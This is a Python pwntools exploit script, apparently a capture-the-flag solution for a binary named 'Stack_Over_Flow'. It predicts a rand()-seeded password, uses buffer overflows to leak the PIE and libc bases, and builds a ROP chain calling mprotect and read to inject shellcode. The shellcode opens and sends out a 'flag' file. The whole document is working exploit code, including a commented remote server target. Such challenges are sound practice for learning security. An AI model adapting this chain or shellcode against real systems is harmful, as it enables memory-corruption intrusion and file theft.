from pwn import *

from ctypes import *

context(log_level="debug", arch="amd64", os="linux")

#io = remote("45.40.247.139",24720)
#io=remote("127.0.0.1",9999)
io = process("./Stack_Over_Flow")
elf = ELF("./Stack_Over_Flow")
libc = ELF("./libc.so.6")
elf1 = CDLL("./libc.so.6")  # 动态链接库，也就是.so文件。
elf1.srand(elf1.time(0))  # 用时间做种子
password = elf1.rand() % 5
print(hex(password))


def dbg(cmd=""):
    gdb.attach(io, cmd)


io.recvuntil(b'Good luck!\n')

io.send(b"a" * (0x108) + b"\x5f")
io.recvuntil(b"magic number:")
pie = int(io.recvuntil(b"\n"), 10)
pie = (pie // password) - 0x16B0

info("pie base: " + hex(pie))

io.recvuntil(b'Good luck!\n')

io.sendline(b"b" * 0x108 + p64(pie + 0x12C9) + p64(0x162B + pie))
libc.address = u64(io.recv(6).ljust(8, b"\x00")) - 0x21B780
info("libc base: " + hex(libc.address))
io.recvuntil(b'Good luck!\n')

payload = b"c" * (0x108 + 8)
payload += p64(next(libc.search(asm("pop rdi; ret;"), executable=True)))
payload += p64(pie)
payload += p64(next(libc.search(asm("pop rsi; ret;"), executable=True)))
payload += p64(0x8000)
payload += p64(next(libc.search(asm("pop rdx;pop rbx;ret;"), executable=True)))
payload += p64(7)
payload += p64(7)
payload += p64(next(libc.search(asm("pop rax; ret;"), executable=True)))
payload += p64(10)
payload += p64(next(libc.search(asm("syscall; ret;"), executable=True)))

payload += p64(next(libc.search(asm("pop rdi; ret;"), executable=True)))
payload += p64(0)
payload += p64(next(libc.search(asm("pop rsi; ret;"), executable=True)))
payload += p64(pie+0x2000)
payload += p64(next(libc.search(asm("pop rdx;pop rbx;ret;"), executable=True)))
payload += p64(0x100)
payload += p64(0x100)
payload += p64(next(libc.search(asm("pop rax; ret;"), executable=True)))
payload += p64(0)
payload += p64(next(libc.search(asm("syscall; ret;"), executable=True)))
payload += p64(pie + 0x2000)

io.send(payload)
sleep(3)
shellcode = asm(
    """
mov rax, 0x101
mov rdi,0
sub rdi, 0x64            
mov rbx, 0x67616c66
push rbx
mov    rsi, rsp
xor    rdx, rdx 
xor    r10, r10 
syscall
    mov rdi, 1
    mov rsi, 3
    push 0
    mov rdx, rsp
    mov r10, 0x100
    push SYS_sendfile
    pop rax
    syscall
"""
)
io.sendline(shellcode)

io.interactive()
